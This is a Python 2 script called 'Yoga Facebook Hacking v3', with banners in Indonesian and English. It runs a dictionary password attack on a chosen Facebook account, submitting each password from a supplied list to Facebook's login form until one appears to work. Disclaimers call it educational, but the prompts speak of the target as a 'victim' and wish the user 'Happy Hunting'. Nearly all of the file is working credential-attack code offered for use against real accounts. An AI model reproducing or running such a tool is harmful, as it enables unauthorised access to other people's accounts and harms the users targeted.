#!usr/bin/python
#Yoga Facebook Hacking Version 3 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 
#Antar-Anonymous Attacker is not responsible.


import sys
import random
import mechanize
import cookielib


GHT = '''
        +==========================================+
        |........Yoga Facebook Hacking v 3.........|
        +------------------------------------------+
        |#Author: Antar-Anonymous Attacker         |
        |         Nakorenep Cyber Army             |
        |#Contact: www.fb.com/panggilbaeyoga       |
        |#Blog: seputar-ilmu-tecnology.blogspot.com|
        |#Date: 12/01/2014                         |
        |                                          |
        |!Warning!:                                |
        |  Tool ini dibuat hanya untuk pentesting. |
        |  Jangan gunakan tool ini pada account    |
        |  facebook manapun tanpa ada izin dari    |
        |  pemilik account! Segala bentuk kejahatan|
        |  dan resiko dari penyalahgunaan tool ini |
        |  ditanggung oleh Anda sendiri.           |
        |                                          |
        |  I take no responsibilities for the use  |
        |             of this program!!!           |
        +==========================================+
        |........Yoga Facebook Hacking v 3.........|
        +------------------------------------------+
'''
print "Note: Tool ini bisa memecahkan akun facebook bahkan jika Anda tidak memiliki email korban Anda"
print "# Gunakanlah program ini dengan bijak"
print "# Happy Hunting ^_^"
print "# Tekan CTRL+C untuk keluar dari program ini"


email = str(raw_input("\n# Masukkan |Email| |Phone number| |Profile ID number| |Username| target facebook yang ingin Anda retas: "))
passwordlist = str(raw_input("Masukkan nama file.txt daftar password list, example; passwordlist.txt : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print "\n\n\n [*] Password found ... !!!"
        print "\n [*] Password : %s\n" % (password)
        print " [*] Hacking Successed, Happy Enjoyed Your Hacking ^_^"
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()
